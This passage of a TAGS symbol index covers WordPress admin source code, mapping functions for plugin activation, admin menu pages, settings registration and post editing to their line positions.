		$plugin_data = get_plugin_data( "$plugin_root/$plugin_file", false, false ); //Do not apply markup/translate as it'll be cached.plugin_data280,10448
function get_mu_plugins() {get_mu_plugins304,11194
	$wp_plugins = array();wp_plugins305,11222
	$plugin_files = array();plugin_files307,11291
	if ( $plugins_dir = @ opendir( WPMU_PLUGIN_DIR ) ) {plugins_dir311,11376
		while ( ( $file = readdir( $plugins_dir ) ) !== false ) {file312,11430
		$plugin_data = get_plugin_data( WPMU_PLUGIN_DIR . "/$plugin_file", false, false ); //Do not apply markup/translate as it'll be cached.plugin_data329,11798
function _sort_uname_callback( $a, $b ) {_sort_uname_callback351,12381
function get_dropins() {get_dropins361,12668
	$dropins = array();dropins362,12693
	$plugin_files = array();plugin_files363,12714
	$_dropins = _get_dropins();_dropins365,12741
	if ( $plugins_dir = @ opendir( WP_CONTENT_DIR ) ) {plugins_dir368,12815
		while ( ( $file = readdir( $plugins_dir ) ) !== false ) {file369,12868
		$plugin_data = get_plugin_data( WP_CONTENT_DIR . "/$plugin_file", false, false ); //Do not apply markup/translate as it'll be cached.plugin_data385,13226
function _get_dropins() {_get_dropins406,13915
	$dropins = array(dropins407,13941
function is_plugin_active( $plugin ) {is_plugin_active434,15325
function is_plugin_inactive( $plugin ) {is_plugin_inactive449,15760
function is_plugin_active_for_network( $plugin ) {is_plugin_active_for_network461,16067
	$plugins = get_site_option( 'active_sitewide_plugins');plugins465,16159
function is_network_only_plugin( $plugin ) {is_network_only_plugin484,16669
	$plugin_data = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin );plugin_data485,16714
function activate_plugin( $plugin, $redirect = '', $network_wide = false, $silent = false ) {activate_plugin518,18161
function activate_plugin( $plugin, $redirect = '', $network_wide = false, $silent = false ) {redirect518,18161
	$plugin = plugin_basename( trim( $plugin ) );plugin519,18255
		$network_wide = true;network_wide522,18384
		$current = get_site_option( 'active_sitewide_plugins', array() );current523,18408
		$current = get_option( 'active_plugins', array() );current526,18565
	$valid = validate_plugin($plugin);valid529,18623
			$output = ob_get_clean();output558,19505
function deactivate_plugins( $plugins, $silent = false, $network_wide = null ) {deactivate_plugins580,20200
function deactivate_plugins( $plugins, $silent = false, $network_wide = null ) {silent580,20200
		$network_current = get_site_option( 'active_sitewide_plugins', array() );network_current582,20304
	$current = get_option( 'active_plugins', array() );current583,20380
	$do_blog = $do_network = false;do_blog584,20433
		$plugin = plugin_basename( trim( $plugin ) );plugin587,20510
		$network_deactivating = false !== $network_wide && is_plugin_active_for_network( $plugin );network_deactivating591,20609
				$do_network = true;do_network598,20880
			$key = array_search( $plugin, $current );key606,21036
				$do_blog = true;do_blog608,21108
function activate_plugins( $plugins, $redirect = '', $network_wide = false, $silent = false ) {activate_plugins641,22160
function activate_plugins( $plugins, $redirect = '', $network_wide = false, $silent = false ) {redirect641,22160
		$plugins = array($plugins);plugins643,22284
	$errors = array();errors645,22315
			$redirect = add_query_arg('plugin', $plugin, $redirect);redirect648,22397
		$result = activate_plugin($plugin, $redirect, $network_wide, $silent);result649,22457
function delete_plugins($plugins, $redirect = '' ) {delete_plugins672,23043
function delete_plugins($plugins, $redirect = '' ) {redirect672,23043
	$checked = array();checked678,23162
	$url = wp_nonce_url('plugins.php?action=delete-selected&verify-delete=1&' . implode('&', $checked), 'bulk-plugins');url683,23268
		$data = ob_get_contents();data685,23460
		$data = ob_get_contents();data698,23818
	$plugins_dir = $wp_filesystem->wp_plugins_dir();plugins_dir716,24358
	$plugins_dir = trailingslashit( $plugins_dir );plugins_dir720,24533
	$errors = array();errors722,24583
		$this_plugin_dir = trailingslashit( dirname($plugins_dir . $plugin_file) );this_plugin_dir729,24752
			$deleted = $wp_filesystem->delete($this_plugin_dir, true);deleted732,25070
			$deleted = $wp_filesystem->delete($plugins_dir . $plugin_file);deleted734,25139
	if ( $current = get_site_transient('update_plugins') ) {current744,25465
function validate_active_plugins() {validate_active_plugins761,25859
	$plugins = get_option( 'active_plugins', array() );plugins762,25896
		$plugins = array();plugins766,26056
		$network_plugins = (array) get_site_option( 'active_sitewide_plugins', array() );network_plugins770,26127
		$plugins = array_merge( $plugins, array_keys( $network_plugins ) );plugins771,26211
	$invalid = array();invalid777,26322
		$result = validate_plugin( $plugin );result781,26415
function validate_plugin($plugin) {validate_plugin800,26821
	$installed_plugins = get_plugins();installed_plugins806,27089
function is_uninstallable_plugin($plugin) {is_uninstallable_plugin820,27446
	$file = plugin_basename($plugin);file821,27490
	$uninstallable_plugins = (array) get_option('uninstall_plugins');uninstallable_plugins823,27526
function uninstall_plugin($plugin) {uninstall_plugin839,27929
	$file = plugin_basename($plugin);file840,27966
	$uninstallable_plugins = (array) get_option('uninstall_plugins');uninstallable_plugins842,28002
		define('WP_UNINSTALL_PLUGIN', $file);WP_UNINSTALL_PLUGIN850,28342
		$callable = $uninstallable_plugins[$file];callable857,28518
 * This function takes a capability which will be used to determine whethertakes876,28882
 * The function which is hooked in to handle the output of the page must checkwhich879,29003
 * @param callback $function The function to be called to output the content for this page.to886,29507
function add_menu_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '', $position = null ) {add_menu_page892,29807
function add_menu_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '', $position = null ) {function892,29807
	$menu_slug = plugin_basename( $menu_slug );menu_slug895,30006
	$hookname = get_plugin_page_hookname( $menu_slug, '' );hookname899,30117
		$icon_url = esc_url( admin_url( 'images/generic.png' ) );icon_url905,30325
		$icon_url = 'https://' . substr($icon_url, 7);icon_url907,30444
	$new_menu = array( $menu_title, $capability, $menu_slug, $page_title, 'menu-top ' . $hookname, $hookname, $icon_url );new_menu909,30494
 * This function takes a capability which will be used to determine whethertakes927,30892
 * The function which is hooked in to handle the output of the page must checkwhich930,31013
 * @param callback $function The function to be called to output the content for this page.to937,31517
function add_object_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '') {add_object_page942,31739
function add_object_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '') {function942,31739
 * This function takes a capability which will be used to determine whethertakes953,32092
 * The function which is hooked in to handle the output of the page must checkwhich956,32213
 * @param callback $function The function to be called to output the content for this page.to963,32717
function add_utility_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '') {add_utility_page968,32939
function add_utility_page( $page_title, $menu_title, $capability, $menu_slug, $function = '', $icon_url = '') {function968,32939
 * This function takes a capability which will be used to determine whethertakes979,33265
 * The function which is hooked in to handle the output of the page must checkwhich982,33386
 * @param callback $function The function to be called to output the content for this page.to990,34008
function add_submenu_page( $parent_slug, $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_submenu_page994,34224
function add_submenu_page( $parent_slug, $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function994,34224
	$menu_slug = plugin_basename( $menu_slug );menu_slug1002,34481
	$parent_slug = plugin_basename( $parent_slug);parent_slug1003,34526
		$parent_slug = $_wp_real_parent_file[$parent_slug];parent_slug1006,34628
	$hookname = get_plugin_page_hookname( $menu_slug, $parent_slug);hookname1026,35442
 * This function takes a capability which will be used to determine whethertakes1044,36030
 * The function which is hooked in to handle the output of the page must checkwhich1047,36151
 * @param callback $function The function to be called to output the content for this page.to1054,36655
function add_management_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_management_page1058,36871
function add_management_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1058,36871
 * This function takes a capability which will be used to determine whethertakes1065,37131
 * The function which is hooked in to handle the output of the page must checkwhich1068,37252
 * @param callback $function The function to be called to output the content for this page.to1075,37756
function add_options_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_options_page1079,37972
function add_options_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1079,37972
 * This function takes a capability which will be used to determine whethertakes1086,38238
 * The function which is hooked in to handle the output of the page must checkwhich1089,38359
 * @param callback $function The function to be called to output the content for this page.to1096,38863
function add_theme_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_theme_page1100,39079
function add_theme_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1100,39079
 * This function takes a capability which will be used to determine whethertakes1107,39335
 * The function which is hooked in to handle the output of the page must checkwhich1110,39456
 * @param callback $function The function to be called to output the content for this page.to1117,39960
function add_plugins_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_plugins_page1121,40176
function add_plugins_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1121,40176
 * This function takes a capability which will be used to determine whethertakes1128,40441
 * The function which is hooked in to handle the output of the page must checkwhich1131,40562
 * @param callback $function The function to be called to output the content for this page.to1138,41066
function add_users_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_users_page1142,41282
function add_users_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1142,41282
		$parent = 'users.php';parent1144,41416
		$parent = 'profile.php';parent1146,41447
 * This function takes a capability which will be used to determine whethertakes1152,41631
 * The function which is hooked in to handle the output of the page must checkwhich1155,41752
 * @param callback $function The function to be called to output the content for this page.to1162,42256
function add_dashboard_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_dashboard_page1166,42472
function add_dashboard_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1166,42472
 * This function takes a capability which will be used to determine whethertakes1173,42729
 * The function which is hooked in to handle the output of the page must checkwhich1176,42850
 * @param callback $function The function to be called to output the content for this page.to1183,43354
function add_posts_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_posts_page1187,43570
function add_posts_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1187,43570
 * This function takes a capability which will be used to determine whethertakes1194,43822
 * The function which is hooked in to handle the output of the page must checkwhich1197,43943
 * @param callback $function The function to be called to output the content for this page.to1204,44447
function add_media_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_media_page1208,44663
function add_media_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1208,44663
 * This function takes a capability which will be used to determine whethertakes1215,44917
 * The function which is hooked in to handle the output of the page must checkwhich1218,45038
 * @param callback $function The function to be called to output the content for this page.to1225,45542
function add_links_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_links_page1229,45758
function add_links_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1229,45758
 * This function takes a capability which will be used to determine whethertakes1236,46018
 * The function which is hooked in to handle the output of the page must checkwhich1239,46139
 * @param callback $function The function to be called to output the content for this page.to1246,46643
function add_pages_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_pages_page1250,46858
function add_pages_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1250,46858
 * This function takes a capability which will be used to determine whethertakes1257,47128
 * The function which is hooked in to handle the output of the page must checkwhich1260,47249
 * @param callback $function The function to be called to output the content for this page.to1267,47753
function add_comments_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {add_comments_page1271,47968
function add_comments_page( $page_title, $menu_title, $capability, $menu_slug, $function = '' ) {function1271,47968
function remove_menu_page( $menu_slug ) {remove_menu_page1283,48362
	foreach ( $menu as $i => $item ) {i1286,48420
		if ( $menu_slug == $item[2] ) {menu_slug1287,48456
function remove_submenu_page( $menu_slug, $submenu_slug ) {remove_submenu_page1305,48798
	foreach ( $submenu[$menu_slug] as $i => $item ) {i1311,48933
		if ( $submenu_slug == $item[2] ) {submenu_slug1312,48984
function menu_page_url($menu_slug, $echo = true) {menu_page_url1332,49490
function menu_page_url($menu_slug, $echo = true) {echo1332,49490
		$parent_slug = $_parent_pages[$menu_slug];parent_slug1336,49612
			$url = admin_url( add_query_arg( 'page', $menu_slug, $parent_slug ) );url1338,49724
			$url = admin_url( 'admin.php?page=' . $menu_slug );url1340,49809
		$url = '';url1343,49878
	$url = esc_url($url);url1346,49895
function get_admin_page_parent( $parent = '' ) {get_admin_page_parent1358,50008
function get_admin_page_parent( $parent = '' ) {parent1358,50008
			$parent = $_wp_real_parent_file[$parent];parent1371,50361
			$parent_file = $_wp_real_parent_file[$parent_file];parent_file1378,50520
	if ( $pagenow == 'admin.php' && isset( $plugin_page ) ) {pagenow1384,50607
				$parent_file = $plugin_page;parent_file1387,50755
					$parent_file = $_wp_real_parent_file[$parent_file];parent_file1389,50844
			$parent_file = $plugin_page;parent_file1394,50986
					$parent_file = $_wp_real_parent_file[$parent_file];parent_file1396,51073
		$parent_file = $pagenow;parent_file1402,51250
			$parent_file = $_wp_real_parent_file[$parent_file];parent_file1404,51331
				$parent = $_wp_real_parent_file[$parent];parent1411,51569
				$parent_file = $parent;parent_file1413,51700
				$parent_file = $parent;parent_file1416,51881
					$parent_file = $parent;parent_file1420,52014
		$parent_file = '';parent_file1427,52106
function get_admin_page_title() {get_admin_page_title1431,52142
	$hook = get_plugin_page_hook( $plugin_page, $pagenow );hook1442,52329
	$parent = $parent1 = get_admin_page_parent();parent1444,52387
					$title = $menu_array[3];title1450,52582
						$title = $menu_array[3];title1454,52754
				$title = $menu_array[0];title1458,52833
					( $plugin_page == $submenu_array[2] ) &&plugin_page1466,53037
						( $parent == $pagenow ) ||parent1468,53090
						( $parent == $plugin_page ) ||parent1469,53123
						( $plugin_page == $hook ) ||plugin_page1470,53160
						( $pagenow == 'admin.php' && $parent1 != $submenu_array[2] ) ||pagenow1471,53195
						( !empty($typenow) && $parent == $pagenow . '?post_type=' . $typenow)parent1472,53265
						$title = $submenu_array[3];title1475,53357
					$title = $submenu_array[3];title1483,53578
					$title = $submenu_array[0];title1486,53655
					( $plugin_page == $menu_array[2] ) &&plugin_page1494,53823
					( $pagenow == 'admin.php' ) &&pagenow1495,53866
					( $parent1 == $menu_array[2] ) )parent11496,53902
						$title = $menu_array[3];title1498,53947
function get_plugin_page_hook( $plugin_page, $parent_page ) {get_plugin_page_hook1508,54046
	$hook = get_plugin_page_hookname( $plugin_page, $parent_page );hook1509,54108
function get_plugin_page_hookname( $plugin_page, $parent_page ) {get_plugin_page_hookname1516,54239
	$parent = get_admin_page_parent( $parent_page );parent1519,54333
	$page_type = 'admin';page_type1521,54384
			$page_type = 'toplevel';page_type1524,54565
				$page_type = $admin_page_hooks[$parent];page_type1527,54645
		$page_type = $admin_page_hooks[$parent];page_type1529,54743
	$plugin_name = preg_replace( '!\.php!', '', $plugin_page );plugin_name1532,54790
function user_can_access_admin_page() {user_can_access_admin_page1537,54901
	$parent = get_admin_page_parent();parent1546,55098
		$hookname = get_plugin_page_hookname($plugin_page, $parent);hookname1555,55345
	if ( isset( $plugin_page ) && ( $plugin_page == $parent ) && isset( $_wp_menu_nopriv[$plugin_page] ) )plugin_page1579,56089
 * @param unknown_type $sanitize_callback A callback function that sanitizes the option's value.that1620,57196
function register_setting( $option_group, $option_name, $sanitize_callback = '' ) {register_setting1623,57316
function register_setting( $option_group, $option_name, $sanitize_callback = '' ) {sanitize_callback1623,57316
		$option_group = 'general';option_group1628,57601
function unregister_setting( $option_group, $option_name, $sanitize_callback = '' ) {unregister_setting1646,57987
function unregister_setting( $option_group, $option_name, $sanitize_callback = '' ) {sanitize_callback1646,57987
		$option_group = 'general';option_group1651,58274
	$pos = array_search( $option_name, (array) $new_whitelist_options );pos1654,58307
function option_update_filter( $options ) {option_update_filter1669,58692
		$options = add_option_whitelist( $new_whitelist_options, $options );options1673,58812
function add_option_whitelist( $new_options, $options = '' ) {add_option_whitelist1688,59123
function add_option_whitelist( $new_options, $options = '' ) {options1688,59123
	if ( $options == '' )options1689,59186
		$whitelist_options = $options;whitelist_options1692,59244
	foreach ( $new_options as $page => $keys ) {page1694,59278
				$pos = array_search( $key, $whitelist_options[ $page ] );pos1700,59541
				if ( $pos === false )pos1701,59603
function remove_option_whitelist( $del_options, $options = '' ) {remove_option_whitelist1719,59875
function remove_option_whitelist( $del_options, $options = '' ) {options1719,59875
	if ( $options == '' )options1720,59941
		$whitelist_options = $options;whitelist_options1723,59999
	foreach ( $del_options as $page => $keys ) {page1725,60033
				$pos = array_search( $key, $whitelist_options[ $page ] );pos1728,60197
function settings_fields($option_group) {settings_fields1745,60594

wordpress/wp-admin/includes/post.php,17525
function _wp_translate_postdata( $update = false, $post_data = null ) {_wp_translate_postdata21,457
function _wp_translate_postdata( $update = false, $post_data = null ) {update21,457
		$post_data = &$_POST;post_data24,556
	$ptype = get_post_type_object( $post_data['post_type'] );ptype54,1451
		$post_id = $post_data['ID'];post_id84,2844
		$post_id = false;post_id86,2881
	$previous_status = $post_id ? get_post_field( 'post_status', $post_id ) : false;previous_status87,2901
		$aa = $post_data['aa'];aa112,4011
		$mm = $post_data['mm'];mm113,4037
		$jj = $post_data['jj'];jj114,4063
		$hh = $post_data['hh'];hh115,4089
		$mn = $post_data['mn'];mn116,4115
		$ss = $post_data['ss'];ss117,4141
		$aa = ($aa <= 0 ) ? date('Y') : $aa;aa118,4167
		$mm = ($mm <= 0 ) ? date('n') : $mm;mm119,4206
		$jj = ($jj > 31 ) ? 31 : $jj;jj120,4245
		$jj = ($jj <= 0 ) ? date('j') : $jj;jj121,4277
		$hh = ($hh > 23 ) ? $hh -24 : $hh;hh122,4316
		$mn = ($mn > 59 ) ? $mn -60 : $mn;mn123,4353
		$ss = ($ss > 59 ) ? $ss -60 : $ss;ss124,4390
function edit_post( $post_data = null ) {edit_post140,4784
function edit_post( $post_data = null ) {post_data140,4784
		$post_data = &$_POST;post_data143,4853
	$post_ID = (int) $post_data['post_ID'];post_ID148,4952
	$post = get_post( $post_ID );post149,4993
	$ptype = get_post_type_object($post_data['post_type']);ptype153,5125
		$post =& get_post( $post_ID );post163,5518
		$now = time();now164,5551
		$then = strtotime($post->post_date_gmt . ' +0000');then165,5568
		$delta = AUTOSAVE_INTERVAL / 2;delta166,5622
	$post_data = _wp_translate_postdata( true, $post_data );post_data171,5713
		foreach ( $post_data['meta'] as $key => $value ) {key203,6708
		foreach ( $post_data['deletemeta'] as $key => $value ) {key215,7141
function bulk_edit_posts( $post_data = null ) {bulk_edit_posts258,8311
function bulk_edit_posts( $post_data = null ) {post_data258,8311
		$post_data = &$_POST;post_data262,8401
		$ptype = get_post_type_object($post_data['post_type']);ptype265,8465
		$ptype = get_post_type_object('post');ptype267,8529
	$post_IDs = array_map( 'intval', (array) $post_data['post'] );post_IDs284,8985
	$reset = array( 'post_author', 'post_status', 'post_password', 'post_parent', 'page_template', 'comment_status', 'ping_status', 'keep_private', 'tax_input', 'post_category', 'sticky' );reset286,9050
			$new_cats = array_map( 'absint', $post_data['post_category'] );new_cats294,9530
	$tax_input = array();tax_input299,9647
		foreach ( $post_data['tax_input'] as $tax_name => $terms ) {tax_name301,9710
				$comma = _x( ',', 'tag delimiter' );comma307,9934
					$terms = str_replace( $comma, ',', $terms );terms309,10001
		$pages = $wpdb->get_results("SELECT ID, post_parent FROM $wpdb->posts WHERE post_type = 'page'");pages316,10234
		$children = array();children317,10334
		for ( $i = 0; $i < 50 && $parent > 0; $i++ ) {i319,10358
					$parent = $page->post_parent;parent324,10501
	$updated = $skipped = $locked = array();updated339,10896
		$post_type_object = get_post_type_object( get_post_type( $post_ID ) );post_type_object341,10975
		$post = get_post( $post_ID );post353,11342
		$tax_names = get_object_taxonomies( $post );tax_names354,11374
			$taxonomy_obj = get_taxonomy($tax_name);taxonomy_obj356,11461
				$new_terms = $tax_input[$tax_name];new_terms358,11601
				$new_terms = array();new_terms360,11649
				$current_terms = (array) wp_get_object_terms( $post_ID, $tax_name, array('fields' => 'ids') );current_terms363,11714
				$current_terms = (array) wp_get_object_terms( $post_ID, $tax_name, array('fields' => 'names') );current_terms365,11821
			$cats = (array) wp_get_post_categories($post_ID);cats371,12077
function get_default_post_to_edit( $post_type = 'post', $create_in_db = false ) {get_default_post_to_edit404,13094
function get_default_post_to_edit( $post_type = 'post', $create_in_db = false ) {post_type404,13094
	$post_title = '';post_title407,13192
		$post_title = esc_html( stripslashes( $_REQUEST['post_title'] ));post_title409,13253
	$post_content = '';post_content411,13322
		$post_content = esc_html( stripslashes( $_REQUEST['content'] ));post_content413,13382
	$post_excerpt = '';post_excerpt415,13450
		$post_excerpt = esc_html( stripslashes( $_REQUEST['excerpt'] ));post_excerpt417,13510
		$post_id = wp_insert_post( array( 'post_title' => __( 'Auto Draft' ), 'post_type' => $post_type, 'post_status' => 'auto-draft' ) );post_id420,13602
		$post = get_post( $post_id );post421,13736
		$post = new stdClass;post425,13991
function get_default_page_to_edit() {get_default_page_to_edit459,15037
	$page = get_default_post_to_edit();page460,15075
function get_post_to_edit( $id ) {get_post_to_edit473,15285
	$post = get_post( $id, OBJECT, 'edit' );post475,15321
function post_exists($title, $content = '', $date = '') {post_exists493,15763
function post_exists($title, $content = '', $date = '') {content493,15763
	$post_title = stripslashes( sanitize_post_field( 'post_title', $title, 0, 'db' ) );post_title496,15837
	$post_content = stripslashes( sanitize_post_field( 'post_content', $content, 0, 'db' ) );post_content497,15922
	$post_date = stripslashes( sanitize_post_field( 'post_date', $date, 0, 'db' ) );post_date498,16013
	$query = "SELECT ID FROM $wpdb->posts WHERE 1=1";query500,16096
	$args = array();args501,16147
function wp_write_post() {wp_write_post531,16669
		$ptype = get_post_type_object($_POST['post_type']);ptype535,16750
		$ptype = get_post_type_object('post');ptype537,16810
	$translated = _wp_translate_postdata( false );translated555,17362
	$post_ID = wp_insert_post( $_POST );post_ID576,17831
function write_post() {write_post605,18373
	$result = wp_write_post();result606,18397
function add_meta( $post_ID ) {add_meta625,18668
	$post_ID = (int) $post_ID;post_ID627,18715
	$metakeyselect = isset($_POST['metakeyselect']) ? stripslashes( trim( $_POST['metakeyselect'] ) ) : '';metakeyselect629,18744
	$metakeyinput = isset($_POST['metakeyinput']) ? stripslashes( trim( $_POST['metakeyinput'] ) ) : '';metakeyinput630,18849
	$metavalue = isset($_POST['metavalue']) ? $_POST['metavalue'] : '';metavalue631,18951
		$metavalue = trim( $metavalue );metavalue633,19052
			$metakey = $metakeyselect;metakey640,19402
			$metakey = $metakeyinput; // defaultmetakey643,19456
		$metakey = esc_sql( $metakey );metakey648,19623
function delete_meta( $mid ) {delete_meta664,19869
function get_meta_keys() {get_meta_keys675,20043
	$keys = $wpdb->get_col( "keys678,20086
function get_post_meta_by_id( $mid ) {get_post_meta_by_id695,20340
function has_meta( $postid ) {has_meta709,20576
function update_meta( $meta_id, $meta_key, $meta_value ) {update_meta727,21032
	$meta_key = stripslashes( $meta_key );meta_key728,21091
	$meta_value = stripslashes_deep( $meta_value );meta_value729,21131
function _fix_attachment_links( $post_ID ) {_fix_attachment_links747,21445
	$post = & get_post( $post_ID, ARRAY_A );post748,21490
	$content = $post['post_content'];content749,21532
	$site_url = get_bloginfo('url');site_url759,21966
	$site_url = substr( $site_url, (int) strpos($site_url, '://') ); // remove the http(s)site_url760,22000
	$replace = '';replace761,22088
	foreach ( $link_matches[1] as $key => $value ) {key763,22105
		$quote = $url_match[1]; // the quote (single or double)quote769,22414
		$url_id = (int) $url_match[2];url_id770,22472
		$rel_id = (int) $rel_match[1];rel_id771,22505
		$link = $link_matches[0][$key];link776,22651
		$replace = str_replace( $url_match[0], 'href=' . $quote . get_attachment_link( $url_id ) . $quote, $link );replace777,22685
		$content = str_replace( $link, $replace, $content );content779,22796
		$post = add_magic_quotes($post);post785,22943
function _relocate_children( $old_ID, $new_ID ) {_relocate_children801,23184
	$old_ID = (int) $old_ID;old_ID803,23249
	$new_ID = (int) $new_ID;new_ID804,23275
	$children = $wpdb->get_col( $wpdb->prepare("children806,23302
function get_available_post_statuses($type = 'post') {get_available_post_statuses826,23884
	$stati = wp_count_posts($type);stati827,23939
function wp_edit_posts_query( $q = false ) {wp_edit_posts_query840,24252
function wp_edit_posts_query( $q = false ) {q840,24252
		$q = $_GET;q842,24318
	$post_stati  = get_post_stati();post_stati845,24432
		$post_type = $q['post_type'];post_type848,24547
		$post_type = 'post';post_type850,24585
	$avail_post_stati = get_available_post_statuses($post_type);avail_post_stati852,24609
		$post_status = $q['post_status'];post_status855,24753
		$perm = 'readable';perm856,24789
		$orderby = $q['orderby'];orderby860,24844
		$orderby = 'modified';orderby862,24967
		$order = $q['order'];order865,25020
		$order = 'ASC';order867,25115
	$per_page = 'edit_' . $post_type . '_per_page';per_page869,25134
	$posts_per_page = (int) get_user_option( $per_page );posts_per_page870,25183
		$posts_per_page = 20;posts_per_page872,25294
	$posts_per_page = apply_filters( $per_page, $posts_per_page );posts_per_page874,25319
	$posts_per_page = apply_filters( 'edit_posts_per_page', $posts_per_page, $post_type );posts_per_page875,25383
	$query = compact('post_type', 'post_status', 'perm', 'order', 'orderby', 'posts_per_page');query877,25472
function get_post_mime_types() {get_post_mime_types902,26051
	$post_mime_types = array(	//	array( adj, noun )post_mime_types903,26084
function get_available_post_mime_types($type = 'attachment') {get_available_post_mime_types920,26756
	$types = $wpdb->get_col($wpdb->prepare("SELECT DISTINCT post_mime_type FROM $wpdb->posts WHERE post_type = %s", $type));types923,26835
function wp_edit_attachments_query( $q = false ) {wp_edit_attachments_query935,27093
function wp_edit_attachments_query( $q = false ) {q935,27093
		$q = $_GET;q937,27165
	$post_type = get_post_type_object( 'attachment' );post_type942,27319
	$states = 'inherit';states943,27371
	$media_per_page = (int) get_user_option( 'upload_per_page' );media_per_page948,27574
		$media_per_page = 20;media_per_page950,27693
	$post_mime_types = get_post_mime_types();post_mime_types953,27795
	$avail_post_mime_types = get_available_post_mime_types('attachment');avail_post_mime_types954,27838
function _edit_attachments_query_helper($where) {_edit_attachments_query_helper970,28323
function postbox_classes( $id, $page ) {postbox_classes985,28635
		$classes = array( '' );classes987,28733
	} elseif ( $closed = get_user_option('closedpostboxes_'.$page ) ) {closed988,28759
			$classes = array( '' );classes990,28860
			$classes = in_array( $id, $closed ) ? array( 'closed' ) : array( '' );classes992,28898
		$classes = array( '' );classes995,28986
	$classes = apply_filters( "postbox_classes_{$page}_{$id}", $classes );classes998,29016
function get_sample_permalink($id, $title = null, $name = null) {get_sample_permalink1012,29378
function get_sample_permalink($id, $title = null, $name = null) {title1012,29378
	$post = &get_post($id);post1013,29444
	$ptype = get_post_type_object($post->post_type);ptype1017,29513
	$original_status = $post->post_status;original_status1019,29564
	$original_date = $post->post_date;original_date1020,29604
	$original_name = $post->post_name;original_name1021,29640
	$permalink = get_permalink($post, true);permalink1039,30392
	$permalink = str_replace("%$post->post_type%", '%pagename%', $permalink);permalink1042,30515
		$uri = get_page_uri($post);uri1046,30648
		$uri = untrailingslashit($uri);uri1047,30678
		$uri = strrev( stristr( strrev( $uri ), '/' ) );uri1048,30712
		$uri = untrailingslashit($uri);uri1049,30763
		$uri = apply_filters( 'editable_slug', $uri );uri1050,30797
		$permalink = str_replace('%pagename%', "{$uri}%pagename%", $permalink);permalink1053,30884
	$permalink = array($permalink, apply_filters('editable_slug', $post->post_name));permalink1056,30962
function get_sample_permalink_html( $id, $new_title = null, $new_slug = null ) {get_sample_permalink_html1077,31638
function get_sample_permalink_html( $id, $new_title = null, $new_slug = null ) {new_title1077,31638
	$post = &get_post($id);post1079,31734
		$ptype = get_post_type_object($post->post_type);ptype1084,31891
		$view_post = $ptype->labels->view_item;view_post1085,31942
		$title = __('Click to edit this part of the permalink');title1086,31984
		$title = __('Temporary permalink. Click to edit this part.');title1088,32053
		$return = '<strong>' . __('Permalink:') . "</strong>\n" . '<span id="sample-permalink">' . $permalink . "</span>\n";return1092,32220
		if ( '' == get_option( 'permalink_structure' ) && current_user_can( 'manage_options' ) && !( 'page' == get_option('show_on_front') && $id == get_option('page_on_front') ) )id1093,32339
		$return = apply_filters('get_sample_permalink_html', $return, $id, $new_title, $new_slug);return1098,32814
			$post_name_abridged = mb_substr($post_name, 0, 14). '&hellip;' . mb_substr($post_name, -14);post_name_abridged1105,33007
			$post_name_abridged = $post_name;post_name_abridged1107,33114
			$post_name_abridged = substr($post_name, 0, 14). '&hellip;' . substr($post_name, -14);post_name_abridged1111,33200
			$post_name_abridged = $post_name;post_name_abridged1113,33301
	$post_name_html = '<span id="editable-post-name" title="' . $title . '">' . $post_name_abridged . '</span>';post_name_html1117,33346
	$display_link = str_replace(array('%pagename%','%postname%'), $post_name_html, $permalink);display_link1118,33456
	$view_link = str_replace(array('%pagename%','%postname%'), $post_name, $permalink);view_link1119,33549
	$return =  '<strong>' . __('Permalink:') . "</strong>\n";return1120,33634
	$return = apply_filters('get_sample_permalink_html', $return, $id, $new_title, $new_slug);return1128,34258
function _wp_post_thumbnail_html( $thumbnail_id = null, $post_id = null ) {_wp_post_thumbnail_html1142,34637
function _wp_post_thumbnail_html( $thumbnail_id = null, $post_id = null ) {thumbnail_id1142,34637
		$post_id = $post_ID;post_id1146,34803
	$upload_iframe_src = esc_url( get_upload_iframe_src('image', $post_id) );upload_iframe_src1148,34827
	$set_thumbnail_link = '<p class="hide-if-no-js"><a title="' . esc_attr__( 'Set featured image' ) . '" href="%s" id="set-post-thumbnail" class="thickbox">%s</a></p>';set_thumbnail_link1149,34902
	$content = sprintf( $set_thumbnail_link, $upload_iframe_src, esc_html__( 'Set featured image' ) );content1150,35069
		$old_content_width = $content_width;old_content_width1153,35223
		$content_width = 266;content_width1154,35262
			$thumbnail_html = wp_get_attachment_image( $thumbnail_id, array( $content_width, $content_width ) );thumbnail_html1156,35351
			$thumbnail_html = wp_get_attachment_image( $thumbnail_id, 'post-thumbnail' );thumbnail_html1158,35462
			$ajax_nonce = wp_create_nonce( "set_post_thumbnail-$post_id" );ajax_nonce1160,35580
			$content = sprintf( $set_thumbnail_link, $upload_iframe_src, $thumbnail_html );content1161,35647
		$content_width = $old_content_width;content_width1164,35937
function wp_check_post_lock( $post_id ) {wp_check_post_lock1178,36304
	$lock = explode( ':', $lock );lock1185,36482
	$time = $lock[0];time1186,36514
